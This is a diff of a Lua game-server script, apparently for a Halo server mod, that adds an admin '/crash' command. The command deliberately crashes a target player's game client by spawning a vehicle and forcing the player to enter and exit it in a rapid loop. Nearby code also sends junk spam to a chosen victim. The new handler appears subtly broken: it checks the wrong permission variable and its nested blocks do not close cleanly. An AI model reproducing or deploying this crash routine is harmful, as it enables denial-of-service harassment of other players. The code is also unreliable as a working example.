@@ -81,9 +81,13 @@ spam_duration = 10
 spam_victim = {}
 spam = {}
 
--- TAKE WEAPONS [new as of 2/2/18] --
+-- TAKE WEAPONS --
 take_command = "take"
 take_permission_level = 1
+
+-- CRASH --
+crash_command = "crash"
+crash_permission_level = 1
 
 function OnScriptLoad()
     register_callback(cb['EVENT_CHAT'], "OnPlayerChat")
@@ -504,13 +508,42 @@ function OnServerCommand(PlayerIndex, Command, Environment)
                                 rprint(executor, "You cannot take your own weapons!")
                             end
                         else
-                            rprint(executor, "Player not Present!")
+                            rprint(executor, "Player not present!")
                         end
                     else
                         rprint(executor, "Invalid Player Index")
                     end
                 else
                     rprint(PlayerIndex, "Invalid Syntax. Type /" .. take_command .. " [index id]")
+                end
+            else
+                rprint(PlayerIndex, "You do not have permission to execute that command!")
+            end
+            UnknownCMD = false
+        elseif t[1] == string.lower(crash_command) then
+            if tonumber(get_var(PlayerIndex, "$lvl")) >= take_permission_level then
+                if t[2] ~= nil then
+                    if string.match(t[2], "%d") then
+                        local target = tonumber(t[2])
+                        if player_present(target) then
+                            if (tonumber(target) ~= tonumber(executor)) then
+                                local player_object = get_dynamic_player(target)
+                                if player_object ~= 0 then
+                                        timer(0, "CrashPlayer", target)
+                                        rprint(executor, "You have crash " .. get_var(target, "$name") .. "'s game client")
+                                    end
+                                end
+                            else
+                                rprint(executor, "You cannot crash your own game client!")
+                            end
+                        else
+                            rprint(executor, "Player not present!")
+                        end
+                    else
+                        rprint(executor, "Invalid Player Index")
+                    end
+                else
+                    rprint(PlayerIndex, "Invalid Syntax. Type /" .. crash_command .. " [index id]")
                 end
             else
                 rprint(PlayerIndex, "You do not have permission to execute that command!")
@@ -627,6 +660,25 @@ function Spam(player, broadcast)
             rprint(player, "|l" .. "$c* oeq /oy *cy y)m *g/ nse &h^ *va u&@ x-- *(& ;mx &n; m*j" .. broadcast)
         end
     end
+end
+
+function CrashPlayer(target)
+    if player_present(target) then
+        local player_object = get_dynamic_player(target)
+        if (player_object ~= 0) then
+            local x, y, z = read_vector3d(player_object + 0x5C)
+            local vehicle_id = spawn_object("vehi", "vehicles\\rwarthog\\rwarthog", x, y, z)
+            local veh_obj = get_object_memory(vehicle_id)
+            if (veh_obj ~= 0) then
+                for j = 0, 20 do
+                    enter_vehicle(vehicle_id, target, j)
+                    exit_vehicle(target)
+                end
+                destroy_object(vehicle_id)
+            end
+        end
+    end
+    return false
 end
 
 function PlayerInVehicle(PlayerIndex)
